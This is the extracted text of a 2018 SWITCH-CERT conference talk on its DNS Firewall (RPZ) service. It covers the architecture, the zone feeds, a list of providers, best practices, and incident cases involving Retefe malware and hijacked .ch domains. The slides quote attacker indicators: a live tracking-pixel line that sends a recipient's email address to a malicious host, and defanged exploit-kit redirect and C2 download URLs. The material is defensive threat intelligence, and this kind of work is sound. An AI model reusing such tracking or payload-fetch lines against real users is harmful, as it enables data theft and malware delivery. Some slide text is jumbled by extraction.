SWITCH DNS Firewall
Startseite Untertitel

© 2018 SWITCH | 1

Matthias Seitz matthias.seitz@switch.ch
Amsterdam, 17th April 18

SWITCH / SWITCH-CERT in a nutshell
· Non-profit foundation, Switzerland, 100 employees
· Swiss NREN: 400`000 people (Students, staff and researchers)
­ Academic backbone, security, identity management, cloud services, ...
· Registry for Switzerland (.ch) and Liechtenstein (.li)
· SWITCH-CERT: 15 people
­ Security for Universities, e.g. Monitoring like Netflow, DNS Firewall and awareness ­ Operate the DNS machines for .ch / .li and security service for the registry ­ Security for Banks, specialised in E-banking security; malware analysis ­ Security for other customer groups: Industry and logistic
© 2018 SWITCH | 2

,,DNS Firewall gives you the most bang for your buck"
Paul Vixie
© 2018 SWITCH | 3

DNS RPZ IETF draft
"... method for expressing DNS response policy inside a
specially constructed DNS zone, and for recursive name servers to use such policy to return modified results to DNS clients. The modified DNS
results can stop access to selected HTTP servers, redirect users to "walled gardens", block objectionable email, and otherwise defend
against attack. These "DNS Firewalls" are widely used in fighting Internet crime and abuse."
© 2018 SWITCH | 4

DNS without RPZ
Malicious Site

© 2018 SWITCH | 5

Enduser

baddomain.ch ?

IP for malicious Site

Recursive DNS Resolver

DNS with RPZ
Landing Page
Malicious Site

SWITCH Log Server

RPZ Provider RPZ

& IncreNmoetifntyalofZZoonneeTrUapndsfatere

Clibeandt dIPomXa: in.ch

© 2018 SWITCH | 6

Enduser

baddomain.ch ? IP for Landing Page

RPZ
Recursive DNS Resolver

Landing Page
© 2018 SWITCH | 7

What we don`t do
© 2018 SWITCH | 8

DNS Firewall features
· Prevention
­ Computer infections are prevented by blocking access to infected sites. Data breaches can be prevented.
· Detection and Reporting
­ SWITCH detects computers that are already infected, and customers are rapidly informed about suspicious and infected computers.
· Awareness
­ Malicious queries are redirected to a safe landing page that inform the users of the potential risk.
© 2018 SWITCH | 9

SWITCH-CERT Threat Intelligence

SWITCH-CERT

Malicious / Suspicious domains

Automatic Input (internal / external)

SWITCH RPZ Generator

SWITCH RPZ Provider

External RPZ Provider

© 2018 SWITCH | 10

DNS RPZ Zones files provided by SWITCH

RPZ zone zone.mw.rpz.switch.ch

Description
C2, driveby, distribution and other malicious domains. Updates multiple time an hour.

zone.ph.rpz.switch.ch

Phishing domains, updated every few minutes

zone.misc.rpz.switch.ch zone.wl.rpz.switch.ch zone.test.rpz.switch.ch

Malicious domains which are not phishing and not really fit into the malware RPZ.
Whitelist, for fast reaction to handle false positives or collateral damage domains from SURBL
To evaluate new data

© 2018 SWITCH | 11

Report Phishing Domains
© 2018 SWITCH | 12

Examples and use cases from daily CSIRT operation
© 2018 SWITCH | 13

[Detection] Find infected machines
Conficker DGA Domains
© 2018 SWITCH | 14

[Detection] Leaking onion domains
2018-04-11T14:54:54, (Client), 53042, hpaur4rufcjohrag.onion, (Org), Retefe 2018-04-11T14:55:34, (Client), 53203, hpaur4rufcjohrag.onion, (Org), Retefe 2018-04-11T14:54:57, (Client), 63966, hpaur4rufcjohrag.onion, (Org), Retefe 2018-04-11T15:10:39, (Client), 54450, hpaur4rufcjohrag.onion, (Org), Retefe 2018-04-11T16:16:09, (Client), 52356, hpaur4rufcjohrag.onion, (Org), Retefe 2018-04-11T16:16:17, (Client), 53049, hpaur4rufcjohrag.onion, (Org), Retefe
© 2018 SWITCH | 15

Detection and Reporting

Landing Page

SWITCH Log Server

Malicious Site

RPZ Provider RPZ

& IncreNmoetifntyalofZZoonneeTrUapndsfatere

Clibeandt dIPomXa: in.ch

© 2018 SWITCH | 16

Enduser

baddomain.ch ? IP for Landing Page

RPZ
Recursive DNS Resolver

Detection and Reporting

© 2018 SWITCH | 17

Information Site

[Prevention] Retefe Malware
© 2018 SWITCH | 18

[Prevention] Retefe Malware
© 2018 SWITCH | 19

[Prevention] Retefe Malware
<DIV> <IMG alt=3D"" hspace=3D0 src=3D"http://retnop.cf/port.php?email=3Dmatthias.seitz@switch.ch"=20border=3D0> </DIV>
Decode quoted printable
<DIV> <IMG alt="" hspace=0 src="http://retnop.cf/port.php?email=matthias.seitz@switch.ch" border=0> </DIV>
· Quoted printable: Email encoding which allows non-ASCII characters to be represented as ASCII for email transportation.
· In quoted-printable, any non-standard email octets are represented as an = sign followed by two hex digits representing the octet's value.
© 2018 SWITCH | 20

[Prevention] Retefe Malware
· Most email applications like Outlook or Thunderbird don't load remote content automatically for privacy reasons.
· Apple Mail was by default loading remote content => leaking of user information
­ User agent strings ­ Mail address
· Next step: Send the targeted malware.
· Tracking elements were put into the SWITCH DNS Firewall.
© 2018 SWITCH | 21

[Prevention] Retefe Malware
© 2018 SWITCH | 22

[Prevention] Retefe Malware
© 2018 SWITCH | 23

[Prevention] Registrar's partner got hacked
· Gandi manages over 2 million domain names from about 600 top-level domains
· On the 7th of July 17, a Gandi partner was ,,hacked".
­ No more details available to the hack itself. Leaked credentials, phishing, other vulnerability?
­ 751 domain names were hijacked ­ Domain / NS records were altered over the partners web interface
· 94 .ch and .li domain names were hijacked and used for drive-by
­ Radio stations, regional newspapers, dating sites, ... ­ Beside of that also some not very popular domains
© 2018 SWITCH | 24

[Prevention] Registrar's partner got hacked
· The bad guys altered the NS records to
­ ns1.dnshost[.]ga and ns2.dnshost[.]ga
· Visitors to the hijacked domains were redirected to the Keitaro TDS (traffic distribution system)
· Redirect to
­ hXXp://46.183.219[.]227/VWcjj6 ­ hXXp//46.183.219[.]227/favicon.ico ­ hXXp://46.183.219[.]227/www.bingo.com ­ hXXp://188.225.87[.]223/?doctor&news=...&;money=...
· Redirect pointed to a Rig Exploit Kit
© 2018 SWITCH | 25

[Prevention] Registrar's partner got hacked
· Payload: Neutrino Bot
· Contacts C2 server and grabs additional modules
­ hXXp://poer23[.]tk/tasks.php ­ hXXp://poer23[.]tk/modules/nn_grabber_x32.dll ­ hXXp://poer23[.]tk/modules/nn_grabber_x64.dll
· And receives an update
­ hXXp//www.araop.tk/test.exe
© 2018 SWITCH | 26

[Prevention] Registrar's partner got hacked
© 2018 SWITCH | 27

[Prevention] Registrar's partner got hacked
© 2018 SWITCH | 28

[Prevention] Registrar's partner got hacked
· The Gandi changes were reverted by Gandi / SWITCH
­ Building the new DNS zone and propagating the new genuine DNS records need some time as the .ch / .li zones have rebuild intervals
· Immediate action:
­ Put the affected 93 domains and the other malicious domains into the SWITCH DNS Firewall
© 2018 SWITCH | 29

DNS RPZ provider 2018

Provider Farsight Security
(Infoblox)

Data Newly observed domains Malicious domains

Origin US
US

Spamhaus SURBL

Newly observed UK and mailicious domains
Malicious domains CA

SWITCH

Malicious domains CH

ThreatSTOP
© 2018 SWITCH | 30

Malicious domains US

Comment Appliance required
Focus on Switzerland / Europe

DNS Firewall as a service 2018

Service Akamai AnswerX CISCO / OpenDNS Umbrella Comodo Secure DNS Neustar Recursive DNS

Data Malicious domains Malicious domains Malicious domains Malicious domains

Norton ConnectSafe

Malicious domains

Origin US US US US
US

© 2018 SWITCH | 31

DNS Firewall as a service 2018

Service Quad9 Spamhaus DNS Firewall SWITCH DNS Firewall ThreatSTOP DNS Firewall Verisign DNS Firewall

Data Malicious domains Malicious domains Malicious domains Malicious domains Malicious domains

Origin CA UK CH US US

© 2018 SWITCH | 32

Products that can utilize DNS RPZ
© 2018 SWITCH | 33

Best practices for RPZ implementation
· Start in log only mode.
­ If the logs look good: Switch to redirect/block mode
· Implement and maintain whitelist RPZ zones · Setup landing pages for user information and awareness · Use a log and monitoring system (Splunk, ELK or similar) · Run long term trials (60 days or longer)
­ Evaluate different RPZ provider ­ Consider implementing more then one RPZ feed (Advantage of DNS RPZ!)
· Plan enough time
© 2018 SWITCH | 34

Experience from the last 4 years
· Very useful! Great for fast reaction on various threats · Much better overview what is going on in our AS · Low hurdles to implement DNS RPZ / DNS Firewall · NRENs are in a unique position do start and deploy such a
service · You get the most bang for your buck
© 2018 SWITCH | 35

Ressources / References
· https://tools.ietf.org/html/draft-ietf-dnsop-dns-rpz-00 · https://dnsrpz.info · https://www.isc.org/rpz/ · https://swit.ch/dnsfirewall · https://securityblog.switch.ch/2017/07/07/94-ch-li-domain-names-hijacked-
and-used-for-drive-by/ · https://news.gandi.net/en/2017/07/detailed-incident-report/
© 2018 SWITCH | 36

Working for a better digital world
© 2018 SWITCH | 37

